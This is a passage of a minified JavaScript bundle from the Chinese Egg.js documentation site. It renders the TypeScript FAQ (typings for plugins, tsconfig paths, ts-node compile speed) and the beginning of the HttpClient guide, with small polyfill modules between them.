ts-node\uff0c\u4e5f\u5c31\u662f\u53ea\u6709\u5728\u4f7f\u7528 egg-bin \u7684\u65f6\u5019\u624d\u5141\u8bb8\u76f4\u63a5\u8fd0\u884c ts \u3002"),r.a.createElement("p",null,"egg-scripts \u662f\u7528\u4e8e\u5728\u751f\u4ea7\u73af\u5883\u4e0b\u8fd0\u884c egg \u7684 cli \uff0c\u5728\u751f\u4ea7\u73af\u5883\u4e0b\u6211\u4eec\u5efa\u8bae\u5c06 ts \u7f16\u8bd1\u6210 js \u4e4b\u540e\u518d\u8fd0\u884c\uff0c\u6bd5\u7adf\u5728\u7ebf\u4e0a\u662f\u9700\u8981\u8003\u8651\u5e94\u7528\u7684\u5065\u58ee\u6027\u548c\u6027\u80fd\u7684\uff0c\u56e0\u6b64\u4e0d\u5efa\u8bae\u5728\u7ebf\u4e0a\u73af\u5883\u4f7f\u7528 ts-node \u6765\u8fd0\u884c\u5e94\u7528\u3002"),r.a.createElement("p",null,"\u800c\u5728\u5f00\u53d1\u671f ts-node \u80fd\u964d\u4f4e tsc \u7f16\u8bd1\u4ea7\u751f\u7684\u6587\u4ef6\u5e26\u6765\u7684\u7ba1\u7406\u6210\u672c\uff0c\u5e76\u4e14 ts-node \u5e26\u6765\u7684\u6027\u80fd\u635f\u8017\u5728\u5f00\u53d1\u671f\u51e0\u4e4e\u53ef\u4ee5\u5ffd\u7565\uff0c\u6240\u4ee5\u6211\u4eec\u5728 egg-bin \u96c6\u6210\u4e86 ts-node\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u603b\u7ed3\uff1a\u5982\u679c\u9879\u76ee\u9700\u8981\u5728\u7ebf\u4e0a\u8fd0\u884c\uff0c\u8bf7\u5148\u4f7f\u7528 tsc \u5c06 ts \u7f16\u8bd1\u6210 js \uff08 ",r.a.createElement("code",null,"npm run tsc")," \uff09\u518d\u8fd0\u884c ",r.a.createElement("code",null,"npm start"),"\u3002")),r.a.createElement("h3",{id:"\u4f7f\u7528\u4e86-egg-\u63d2\u4ef6\u540e\u53d1\u73b0\u6ca1\u6709\u5bf9\u5e94\u63d2\u4ef6\u6302\u8f7d\u7684\u5bf9\u8c61"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528\u4e86-egg-\u63d2\u4ef6\u540e\u53d1\u73b0\u6ca1\u6709\u5bf9\u5e94\u63d2\u4ef6\u6302\u8f7d\u7684\u5bf9\u8c61","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528\u4e86 egg \u63d2\u4ef6\u540e\u53d1\u73b0\u6ca1\u6709\u5bf9\u5e94\u63d2\u4ef6\u6302\u8f7d\u7684\u5bf9\u8c61"),r.a.createElement("p",null,"\u9047\u5230\u8be5\u95ee\u9898\uff0c\u4e00\u822c\u662f\u4e24\u79cd\u539f\u56e0\uff1a"),r.a.createElement("p",null,r.a.createElement("strong",null,"1. \u8be5 egg \u63d2\u4ef6\u672a\u5b9a\u4e49 d.ts \u3002")),r.a.createElement("p",null,"\u5982\u679c\u8981\u5728\u63d2\u4ef6\u4e2d\u5c06\u67d0\u4e2a\u5bf9\u8c61\u6302\u8f7d\u5230 egg \u7684\u7c7b\u578b\u4e2d\uff0c\u9700\u8981\u6309\u7167\u4e0a\u9762\u5199\u7684 ",r.a.createElement("code",null,"\u63d2\u4ef6 / \u6846\u67b6\u5f00\u53d1\u6307\u5357")," \u8865\u5145\u58f0\u660e\u6587\u4ef6\u5230\u5bf9\u5e94\u63d2\u4ef6\u4e2d\u3002"),r.a.createElement("p",null,"\u5982\u679c\u9700\u8981\u4e0a\u7ebf\u60f3\u5feb\u901f\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u9879\u76ee\u4e0b\u65b0\u5efa\u4e2a\u58f0\u660e\u6587\u4ef6\u6765\u89e3\u51b3\u3002\u6bd4\u5982\u6211\u4f7f\u7528\u4e86 ",r.a.createElement("code",null,"egg-dashboard")," \u8fd9\u4e2a\u63d2\u4ef6\uff0c\u8fd9\u4e2a\u63d2\u4ef6\u5728 egg \u7684 app \u4e2d\u6302\u8f7d\u4e86\u4e2a dashboard \u5bf9\u8c61\uff0c\u4f46\u662f\u8fd9\u4e2a\u63d2\u4ef6\u6ca1\u6709\u58f0\u660e\uff0c\u76f4\u63a5\u4f7f\u7528 ",r.a.createElement("code",null,"app.dashboard")," \u53c8\u4f1a\u6709\u7c7b\u578b\u9519\u8bef\uff0c\u6211\u53c8\u6025\u7740\u89e3\u51b3\u8be5\u95ee\u9898\uff0c\u5c31\u53ef\u4ee5\u5728\u9879\u76ee\u4e0b\u7684 typings \u76ee\u5f55\u4e0b\u65b0\u5efa\u4e2a ",r.a.createElement("code",null,"index.d.ts")," \uff0c\u5e76\u4e14\u5199\u5165\u4ee5\u4e0b\u5185\u5bb9"),r.a.createElement(o["a"],{code:"// typings/index.d.ts\n\nimport 'egg';\n\ndeclare module 'egg' {\n  interface Application {\n    dashboard: any;\n  }\n}",lang:"typescript"}),r.a.createElement("p",null,"\u5373\u53ef\u89e3\u51b3\uff0c\u5f53\u7136\uff0c\u6211\u4eec\u66f4\u671f\u671b\u4f60\u80fd\u7ed9\u7f3a\u5c11\u58f0\u660e\u7684\u63d2\u4ef6\u63d0 PR \u8865\u58f0\u660e\uff0c\u65b9\u4fbf\u4f60\u6211\u4ed6\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"2. egg \u63d2\u4ef6\u5b9a\u4e49\u4e86 d.ts \uff0c\u4f46\u662f\u6ca1\u6709\u5f15\u5165\u3002")),r.a.createElement("p",null,"\u5982\u679c egg \u63d2\u4ef6\u4e2d\u6b63\u786e\u65e0\u8bef\u5b9a\u4e49\u4e86 d.ts \uff0c\u4e5f\u9700\u8981\u5728\u5e94\u7528\u6216\u8005\u6846\u67b6\u5c42\u663e\u5f0f import \u4e4b\u540e ts \u624d\u80fd\u52a0\u8f7d\u5230\u5bf9\u5e94\u7c7b\u578b\u3002"),r.a.createElement("p",null,"\u5982\u679c\u4f7f\u7528\u4e86 egg-ts-helper \uff0cegg-ts-helper \u4f1a\u81ea\u52a8\u6839\u636e\u5e94\u7528\u4e2d\u5f00\u542f\u4e86\u4ec0\u4e48\u63d2\u4ef6\u4ece\u800c\u751f\u6210\u663e\u5f0f import \u63d2\u4ef6\u7684\u58f0\u660e\u3002\u5982\u679c\u672a\u4f7f\u7528\uff0c\u5c31\u9700\u8981\u5f00\u53d1\u8005\u81ea\u884c\u5728 ",r.a.createElement("code",null,"d.ts")," \u4e2d\u663e\u5f0f import \u5bf9\u5e94\u63d2\u4ef6\u3002"),r.a.createElement(o["a"],{code:"// typings/index.d.ts\n\nimport 'egg-dashboard';",lang:"typescript"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u5fc5\u987b\u5728 d.ts \u4e2d import\uff0c\u56e0\u4e3a egg \u63d2\u4ef6\u5927\u90e8\u5206\u6ca1\u6709\u5165\u53e3\u6587\u4ef6\uff0c\u5982\u679c\u5728 ts \u4e2d import \u7684\u8bdd\u8fd0\u884c\u4f1a\u51fa\u95ee\u9898\u3002")),r.a.createElement("h3",{id:"\u5728-tsconfigjson-\u4e2d\u914d\u7f6e\u4e86-paths-\u65e0\u6548"},r.a.createElement(l["AnchorLink"],{to:"#\u5728-tsconfigjson-\u4e2d\u914d\u7f6e\u4e86-paths-\u65e0\u6548","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5728 tsconfig.json \u4e2d\u914d\u7f6e\u4e86 paths \u65e0\u6548"),r.a.createElement("p",null,"\u8fd9\u4e2a\u4e25\u683c\u6765\u8bf4\u4e0d\u5c5e\u4e8e egg \u7684\u95ee\u9898\uff0c\u4f46\u662f\u95ee\u7684\u4eba\u4e0d\u5c11\uff0c\u56e0\u6b64\u4e5f\u5728\u6b64\u89e3\u7b54\u4e00\u4e0b\u3002\u539f\u56e0\u662f tsc \u5c06 ts \u7f16\u8bd1\u6210 js \u7684\u65f6\u5019\uff0c\u5e76\u4e0d\u4f1a\u53bb\u8f6c\u6362 import \u7684\u6a21\u5757\u8def\u5f84\uff0c\u56e0\u6b64\u5f53\u4f60\u5728 tsconfig.json \u4e2d\u914d\u7f6e\u4e86 paths \u4e4b\u540e\uff0c\u5982\u679c\u4f60\u5728 ts \u4e2d\u4f7f\u7528 paths \u5e76 import \u4e86\u5bf9\u5e94\u6a21\u5757\uff0c\u7f16\u8bd1\u6210 js \u7684\u65f6\u5019\u5c31\u6709\u5927\u6982\u7387\u51fa\u73b0\u6a21\u5757\u627e\u4e0d\u5230\u7684\u60c5\u51b5\u4e86\u3002"),r.a.createElement("p",null,"\u89e3\u51b3\u529e\u6cd5\u662f\uff0c\u8981\u4e48\u4e0d\u7528 paths \uff0c\u8981\u4e48\u4f7f\u7528 paths \u7684\u65f6\u5019\u53ea\u7528\u6765 import \u4e00\u4e9b\u58f0\u660e\u800c\u975e\u5177\u4f53\u503c\uff0c\u518d\u8981\u4e48\u5c31\u53ef\u4ee5\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"https://github.com/dividab/tsconfig-paths"},"tsconfig-paths")," \u6765 hook \u6389 node \u4e2d\u7684\u6a21\u5757\u8def\u5f84\u89e3\u6790\u903b\u8f91\uff0c\u4ece\u800c\u652f\u6301 tsconfig.json \u4e2d\u7684 paths\u3002"),r.a.createElement("p",null,"\u4f7f\u7528 tsconfig-paths \u53ef\u4ee5\u76f4\u63a5\u5728 config/plugin.ts \u4e2d\u5f15\u5165\uff0c\u56e0\u4e3a plugin.ts \u4e0d\u7ba1\u5728 App \u4e2d\u8fd8\u662f\u5728 Agent \u4e2d\u90fd\u662f\u7b2c\u4e00\u4e2a\u52a0\u8f7d\u7684\uff0c\u56e0\u6b64\u5728\u8fd9\u4e2a\u4ee3\u7801\u4e2d\u5f15\u5165 tsconfig-paths \u5373\u53ef\u3002"),r.a.createElement(o["a"],{code:"// config/plugin.ts\n\nimport 'tsconfig-paths/register';\n\n...",lang:"typescript"}),r.a.createElement("h3",{id:"\u7ed9-egg-\u63d2\u4ef6\u63d0\u4ea4\u58f0\u660e\u7684\u65f6\u5019\u5982\u4f55\u7f16\u5199\u5355\u6d4b"},r.a.createElement(l["AnchorLink"],{to:"#\u7ed9-egg-\u63d2\u4ef6\u63d0\u4ea4\u58f0\u660e\u7684\u65f6\u5019\u5982\u4f55\u7f16\u5199\u5355\u6d4b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7ed9 egg \u63d2\u4ef6\u63d0\u4ea4\u58f0\u660e\u7684\u65f6\u5019\u5982\u4f55\u7f16\u5199\u5355\u6d4b\uff1f"),r.a.createElement("p",null,"\u7531\u4e8e\u6709\u4e0d\u5c11\u5f00\u53d1\u8005\u5728\u7ed9 egg \u63d2\u4ef6\u63d0\u4ea4\u58f0\u660e\u7684\u65f6\u5019\uff0c\u4e0d\u77e5\u9053\u5982\u4f55\u7f16\u5199\u5355\u6d4b\u6765\u6d4b\u8bd5\u58f0\u660e\u7684\u51c6\u786e\u6027\uff0c\u56e0\u6b64\u4e5f\u5728\u8fd9\u91cc\u8bf4\u660e\u4e00\u4e0b\u3002"),r.a.createElement("p",null,"\u5f53\u7ed9\u4e00\u4e2a egg \u63d2\u4ef6\u7f16\u5199\u597d\u58f0\u660e\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u5728 ",r.a.createElement("code",null,"test/fixures")," \u4e0b\u521b\u5efa\u4e2a\u4f7f\u7528 ts \u5199\u7684 egg \u5e94\u7528\uff0c\u53c2\u8003 \uff08 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view/tree/master/test/fixtures/apps/ts"},"https://github.com/eggjs/egg-view/tree/master/test/fixtures/apps/ts")," \uff09\uff0c\u8bb0\u5f97\u5728 tsconfig.json \u4e2d\u52a0\u5165 paths \u7684\u914d\u7f6e\u4ece\u800c\u65b9\u4fbf\u5728 fixture \u4e2d import \uff0c\u6bd4\u5982 egg-view \u4e2d\u7684"),r.a.createElement(o["a"],{code:'"paths": {\n      "egg-view": ["../../../../"]\n    }',lang:"json"}),r.a.createElement("p",null,"\u540c\u65f6\u8bb0\u4f4f\u4e0d\u8981\u5728 tsconfig.json \u4e2d\u914d\u7f6e ",r.a.createElement("code",null,'"skipLibCheck": true')," \uff0c\u5982\u679c\u914d\u7f6e\u4e86\u8be5\u5c5e\u6027\u4e3a true \uff0ctsc \u7f16\u8bd1\u7684\u65f6\u5019\u4f1a\u5ffd\u7565 d.ts \u4e2d\u7684\u7c7b\u578b\u6821\u9a8c\uff0c\u8fd9\u6837\u5355\u6d4b\u5c31\u65e0\u610f\u4e49\u4e86\u3002"),r.a.createElement("p",null,"\u7136\u540e\u518d\u6dfb\u52a0\u4e00\u4e2a\u7528\u4f8b\u7528\u6765\u9a8c\u8bc1\u63d2\u4ef6\u7684\u58f0\u660e\u4f7f\u7528\u662f\u5426\u6b63\u786e\u5373\u53ef\uff0c\u8fd8\u662f\u62ff egg-view \u6765\u505a\u793a\u4f8b\u3002"),r.a.createElement(o["a"],{code:"describe('typescript', () => {\n  it('should compile ts without error', () => {\n    return (\n      coffee\n        .fork(require.resolve('typescript/bin/tsc'), [\n          '-p',\n          path.resolve(__dirname, './fixtures/apps/ts/tsconfig.json'),\n          '--noEmit',\n        ])\n        // .debug()\n        .expect('code', 0)\n        .end()\n    );\n  });\n});",lang:"js"}),r.a.createElement("p",null,"\u53ef\u53c2\u8003\u5355\u6d4b\u7684\u9879\u76ee\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg"},"https://github.com/eggjs/egg")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"https://github.com/eggjs/egg-view")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-logger"},"https://github.com/eggjs/egg-logger"))),r.a.createElement("h3",{id:"\u7f16\u8bd1\u901f\u5ea6\u6162"},r.a.createElement(l["AnchorLink"],{to:"#\u7f16\u8bd1\u901f\u5ea6\u6162","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7f16\u8bd1\u901f\u5ea6\u6162\uff1f"),r.a.createElement("p",null,"\u6839\u636e\u6211\u4eec\u7684\u5b9e\u8df5\uff0cts-node \u662f\u76ee\u524d\u76f8\u5bf9\u8f83\u4f18\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u65e2\u4e0d\u7528\u53e6\u8d77\u7ec8\u7aef\u6267\u884c tsc \uff0c\u4e5f\u80fd\u83b7\u5f97\u8fd8\u80fd\u63a5\u53d7\u7684\u542f\u52a8\u901f\u5ea6\uff08 \u4ec5\u9650\u4e8e ts-node@7 \uff0c\u65b0\u7684\u7248\u672c\u7531\u4e8e\u628a\u6587\u4ef6\u7f13\u5b58\u53bb\u6389\u4e86\uff0c\u5bfc\u81f4\u7279\u522b\u6162\uff08 ",r.a.createElement(l["Link"],{to:"https://github.com/TypeStrong/ts-node/issues/754"},"#754")," \uff09\uff0c\u56e0\u6b64\u672a\u5347\u7ea7 \uff09\u3002"),r.a.createElement("p",null,"\u4f46\u662f\u5982\u679c\u9879\u76ee\u7279\u522b\u5e9e\u5927\uff0cts-node \u7684\u6027\u80fd\u4e5f\u4f1a\u5403\u7d27\uff0c\u6211\u4eec\u63d0\u4f9b\u4e86\u4ee5\u4e0b\u4f18\u5316\u65b9\u6848\u4f9b\u53c2\u8003\uff1a"),r.a.createElement("h4",{id:"\u5173\u95ed\u7c7b\u578b\u68c0\u67e5"},r.a.createElement(l["AnchorLink"],{to:"#\u5173\u95ed\u7c7b\u578b\u68c0\u67e5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5173\u95ed\u7c7b\u578b\u68c0\u67e5"),r.a.createElement("p",null,"\u7f16\u8bd1\u8017\u65f6\u5927\u5934\u662f\u5728\u7c7b\u578b\u68c0\u67e5\uff0c\u5982\u679c\u5173\u95ed\u4e5f\u80fd\u5e26\u6765\u4e00\u5b9a\u7684\u6027\u80fd\u63d0\u5347\uff0c\u53ef\u4ee5\u5728\u542f\u52a8\u5e94\u7528\u7684\u65f6\u5019\u5e26\u4e0a ",r.a.createElement("code",null,"TS_NODE_TRANSPILE_ONLY=true")," \u73af\u5883\u53d8\u91cf\uff0c\u6bd4\u5982"),r.a.createElement(o["a"],{code:"$ TS_NODE_TRANSPILE_ONLY=true egg-bin dev",lang:"bash"}),r.a.createElement("p",null,"\u6216\u8005\u914d\u7f6e tscompiler \u4e3a ts-node \u63d0\u4f9b\u7684\u4ec5\u7f16\u8bd1\u7684\u6ce8\u518c\u5668\u3002"),r.a.createElement(o["a"],{code:'// package.json\n{\n  "name": "demo",\n  "egg": {\n    "typescript": true,\n    "declarations": true,\n    "tscompiler": "ts-node/register/transpile-only"\n  }\n}',lang:"json"}),r.a.createElement("h4",{id:"\u66f4\u6362\u9ad8\u6027\u80fd-compiler"},r.a.createElement(l["AnchorLink"],{to:"#\u66f4\u6362\u9ad8\u6027\u80fd-compiler","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u66f4\u6362\u9ad8\u6027\u80fd compiler"),r.a.createElement("p",null,"\u9664\u4e86 ts-node \u4e4b\u5916\uff0c\u4e1a\u754c\u4e5f\u6709\u4e0d\u5c11\u652f\u6301\u7f16\u8bd1 ts \u7684\u9879\u76ee\uff0c\u6bd4\u5982 esbuild \uff0c\u53ef\u4ee5\u5148\u5b89\u88c5 ",r.a.createElement(l["Link"],{to:"https://github.com/egoist/esbuild-register"},"esbuild-register")),r.a.createElement(o["a"],{code:"$ npm install esbuild-register --save-dev",lang:"bash"}),r.a.createElement("p",null,"\u518d\u5728 package.json \u4e2d\u914d\u7f6e ",r.a.createElement("code",null,"tscompiler")),r.a.createElement(o["a"],{code:'// package.json\n{\n  "name": "demo",\n  "egg": {\n    "typescript": true,\n    "declarations": true,\n    "tscompiler": "esbuild-register"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"\u5373\u53ef\u4f7f\u7528 esbuild-register \u6765\u7f16\u8bd1\uff08 \u6ce8\u610f\uff0cesbuild-register \u4e0d\u5177\u5907 typecheck \u529f\u80fd \uff09\u3002"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u5982\u679c\u60f3\u7528 swc \u4e5f\u4e00\u6837\uff0c\u5b89\u88c5\u4e00\u4e0b ",r.a.createElement(l["Link"],{to:"https://github.com/Brooooooklyn/swc-node#swc-noderegister"},"@swc-node/register")," \uff0c\u7136\u540e\u4e00\u6837\u914d\u7f6e\u5230 tscompiler \u5373\u53ef")),r.a.createElement("h4",{id:"\u4f7f\u7528-tsc"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528-tsc","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528 tsc"),r.a.createElement("p",null,"\u5982\u679c\u8fd8\u662f\u89c9\u5f97\u8fd9\u79cd\u5728\u8fd0\u884c\u65f6\u52a8\u6001\u7f16\u8bd1\u7684\u901f\u5ea6\u5b9e\u5728\u65e0\u6cd5\u5fcd\u53d7\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 tsc \uff0c\u5373\u4e0d\u9700\u8981\u5728 package.json \u4e2d\u914d\u7f6e typescript \u4e3a true \uff0c\u5728\u5f00\u53d1\u671f\u95f4\u5355\u72ec\u8d77\u4e2a\u7ec8\u7aef\u6267\u884c tsc"),r.a.createElement(o["a"],{code:"$ tsc -w",lang:"bash"}),r.a.createElement("p",null,"\u7136\u540e\u518d\u6b63\u5e38\u542f\u52a8 egg \u5e94\u7528\u5373\u53ef"),r.a.createElement(o["a"],{code:"$ egg-bin dev",lang:"bash"}),r.a.createElement("p",null,"\u5efa\u8bae\u5728 .gitignore \u4e2d\u52a0\u4e0a\u5bf9 ",r.a.createElement("code",null,"**/*.js")," \u7684\u914d\u7f6e\uff0c\u907f\u514d\u5c06\u751f\u6210\u7684 js \u4ee3\u7801\u4e5f\u63d0\u4ea4\u5230\u4e86\u8fdc\u7aef\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},nnPr:function(e,t,n){"use strict";n("d9lq")},npLq:function(e,t,n){var a=n("A0UU");e.exports=a.Promise},nrCb:function(e,t,n){"use strict";var a=n("FU0I"),r=Object(a["createContext"])(void 0);t["a"]=r},nzxN:function(e,t,n){"use strict";function a(e){return a="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},a(e)}n.d(t,"a",(function(){return a}))},o3Hr:function(e,t,n){var a=n("Xdqv"),r=n("q7Pv"),l=n("m4/z"),o=r("iterator");e.exports=!a((function(){var e=new URL("b?a=1&b=2&c=3","http://a"),t=e.searchParams,n="";return e.pathname="c%20d",t.forEach((function(e,a){t["delete"]("b"),n+=a+e})),l&&!e.toJSON||!t.sort||"http://a/c%20d?a=1&c=3"!==e.href||"3"!==t.get("c")||"a=1"!==String(new URLSearchParams("?a=1"))||!t[o]||"a"!==new URL("https://a@b").username||"b"!==new URLSearchParams(new URLSearchParams("a=b")).get("a")||"xn--e1aybc"!==new URL("http://\u0442\u0435\u0441\u0442").host||"#%D0%B1"!==new URL("http://a#\u0431").hash||"a1c3"!==n||"x"!==new URL("http://x",void 0).host}))},o7Ua:function(e,t,n){"use strict";var a=n("oyD1"),r=n("XaNN");e.exports=function(){for(var e=a(this),t=r(e.add),n=0,l=arguments.length;n<l;n++)t.call(e,arguments[n]);return e}},o9Ln:function(e,t,n){var a=n("q7Pv"),r=a("iterator"),l=!1;try{var o=0,i={next:function(){return{done:!!o++}},return:function(){l=!0}};i[r]=function(){return this},Array.from(i,(function(){throw 2}))}catch(c){}e.exports=function(e,t){if(!t&&!l)return!1;var n=!1;try{var a={};a[r]=function(){return{next:function(){return{done:n=!0}}}},e(a)}catch(c){}return n}},oERm:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u4e92\u8054\u7f51\u65f6\u4ee3\uff0c\u65e0\u6570\u670d\u52a1\u662f\u57fa\u4e8e HTTP \u534f\u8bae\u8fdb\u884c\u901a\u4fe1\u7684\uff0cWeb \u5e94\u7528\u8c03\u7528\u540e\u7aef HTTP \u670d\u52a1\u662f\u4e00\u79cd\u975e\u5e38\u5e38\u89c1\u7684\u5e94\u7528\u573a\u666f\u3002"),r.a.createElement("p",null,"\u4e3a\u6b64\u6846\u67b6\u57fa\u4e8e ",r.a.createElement(l["Link"],{to:"https://github.com/node-modules/urllib"},"urllib")," \u5185\u7f6e\u5b9e\u73b0\u4e86\u4e00\u4e2a ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/blob/master/lib/core/httpclient.js"},"HttpClient"),"\uff0c\u5e94\u7528\u53ef\u4ee5\u975e\u5e38\u4fbf\u6377\u5730\u5b8c\u6210\u4efb\u4f55 HTTP \u8bf7\u6c42\u3002"),r.a.createElement("h2",{id:"\u901a\u8fc7-app-\u4f7f\u7528-httpclient"},r.a.createElement(l["AnchorLink"],{to:"#\u901a\u8fc7-app-\u4f7f\u7528-httpclient","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u901a\u8fc7 ",r.a.createElement("code",null,"app")," \u4f7f\u7528 HttpClient"),r.a.createElement("p",null,"\u6846\u67b6\u5728\u5e94\u7528\u521d\u59cb\u5316\u7684\u65f6\u5019\uff0c\u4f1a\u81ea\u52a8\u5c06 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/blob/master/lib/core/httpclient.js"},"HttpClient")," \u521d\u59cb\u5316\u5230 ",r.a.createElement("code",null,"app.httpclient"),"\u3002 \u540c\u65f6\u589e\u52a0\u4e86\u4e00\u4e2a ",r.a.createElement("code",null,"app.curl(url, options)")," \u65b9\u6cd5\uff0c\u5b83\u7b49\u4ef7\u4e8e ",r.a.createElement("code",null,"app.httpclient.request(url, options)"),"\u3002"),r.a.createElement("p",null,"\u8fd9\u6837\u5c31\u53ef\u4ee5\u975e\u5e38\u65b9\u4fbf\u5730\u4f7f\u7528 ",r.a.createElement("code",null,"app.curl")," \u65b9\u6cd5\u5b8c\u6210\u4e00\u6b21 HTTP \u8bf7\u6c42\u3002"),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.beforeStart(async () => {\n    // \u793a\u4f8b\uff1a\u542f\u52a8\u7684\u65f6\u5019\u53bb\u8bfb\u53d6 https://registry.npmmirror.com/egg/latest \u7684\u7248\u672c\u4fe1\u606f\n    const result = await app.curl('https://registry.npmmirror.com/egg/latest', {\n      dataType: 'json',\n    });\n    app.logger.info('Egg latest version: %s', result.data.version);\n  });\n};",lang:"js"}),r.a.createElement("h2",{id:"\u901a\u8fc7-ctx-\u4f7f\u7528-httpclient"},r.a.createElement(l["AnchorLink"],{to:"#\u901a\u8fc7-ctx-\u4f7f\u7528-httpclient","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u901a\u8fc7 ",r.a.createElement("code",null,"ctx")," \u4f7f\u7528 HttpClient"),r.a.createElement("p",null,"\u6846\u67b6\u5728 Context \u4e2d\u540c\u6837\u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"ctx.curl(url, options)")," \u548c ",r.a.createElement("code",null,"ctx.httpclient"),"\uff0c\u4fdd\u6301\u8ddf app \u4e0b\u7684\u4f7f\u7528\u4f53\u9a8c\u4e00\u81f4\u3002 \u8fd9\u6837\u5c31\u53ef\u4ee5\u5728\u6709 Context \u7684\u5730\u65b9\uff08\u5982\u5728 controller \u4e2d\uff09\u975e\u5e38\u65b9\u4fbf\u5730\u4f7f\u7528 ",r.a.createElement("code",null,"ctx.curl()")," \u65b9\u6cd5\u5b8c\u6210\u4e00\u6b21 HTTP \u8bf7\u6c42\u3002"),r.a.createElement(o["a"],{code:"// app/controller/npm.js\nclass NpmController extends Controller {\n  async index() {\n    const ctx = this.ctx;\n\n    // \u793a\u4f8b\uff1a\u8bf7\u6c42\u4e00\u4e2a npm \u6a21\u5757\u4fe1\u606f\n    const result = await ctx.curl('https://registry.npmmirror.com/egg/latest', {\n      // \u81ea\u52a8\u89e3\u6790 JSON response\n      dataType: 'json',\n      // 3 \u79d2\u8d85\u65f6\n      timeout: 3000,\n    });\n\n    ctx.body = {\n      status: result.status,\n      headers: result.headers,\n      package: result.data,\n    };\n  }\n}",lang:"js"}),r.a.createElement("h2",{id:"\u57fa\u672c-http-\u8bf7\u6c42"},r.a.createElement(l["AnchorLink"],{to:"#\u57fa\u672c-http-\u8bf7\u6c42","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u57fa\u672c HTTP \u8bf7\u6c42"),r.a.createElement("p",null,"HTTP \u5df2\u7ecf\u88ab\u5e7f\u6cdb\u5927\u91cf\u4f7f\u7528\uff0c\u5c3d\u7ba1 HTTP \u6709\u591a\u79cd\u8bf7\u6c42\u65b9\u5f0f\uff0c\u4f46\u662f\u4e07\u53d8\u4e0d\u79bb\u5176\u5b97\uff0c\u6211\u4eec\u5148\u4ee5\u57fa\u672c\u7684 4 \u4e2a\u8bf7\u6c42\u65b9\u6cd5\u4e3a\u4f8b\u5b50\uff0c \u9010\u6b65\u8bb2\u89e3\u4e00\u4e0b\u66f4\u591a\u7684\u590d\u6742\u5e94\u7528\u573a\u666f\u3002"),r.a.createElement("p",null,"\u4ee5\u4e0b\u4f8b\u5b50\u90fd\u4f1a\u5728 controller \u4ee3\u7801\u4e2d\u5bf9 ",r.a.createElement(l["Link"],{to:"https://httpbin.org/"},"https://httpbin.org")," \u53d1\u8d77\u8bf7\u6c42\u6765\u5b8c\u6210\u3002"),r.a.createElement("h3",{id:"get"},r.a.createElement(l["AnchorLink"],{to:"#get","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"GET"),r.a.createElement("p",null,"\u8bfb\u53d6\u6570\u636e\u51e0\u4e4e\u90fd\u662f\u4f7f\u7528 GET \u8bf7\u6c42\uff0c\u5b83\u662f HTTP \u4e16\u754c\u6700\u5e38\u89c1\u7684\u4e00\u79cd\uff0c\u4e5f\u662f\u6700\u5e7f\u6cdb\u7684\u4e00\u79cd\uff0c\u5b83\u7684\u8bf7\u6c42\u53c2\u6570\u4e5f\u662f\u6700\u5bb9\u6613\u6784\u9020\u7684\u3002"),r.a.createElement(o["a"],{code:"// app/controller/npm.js\nclass NpmController extends Controller {\n  async get() {\n    const ctx = this.ctx;\n    const result = await ctx.curl('https://httpbin.org/get?foo=bar');\n    ctx.status = result.status;\n    ctx.set(result.headers);\n    ctx.body = result.data;\n  }\n}",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"GET \u8bf7\u6c42\u53ef\u4ee5\u4e0d\u7528\u8bbe\u7f6e ",r.a.createElement("code",null,"options.method")," \u53c2\u6570\uff0cHttpClient \u7684\u9ed8\u8ba4 method 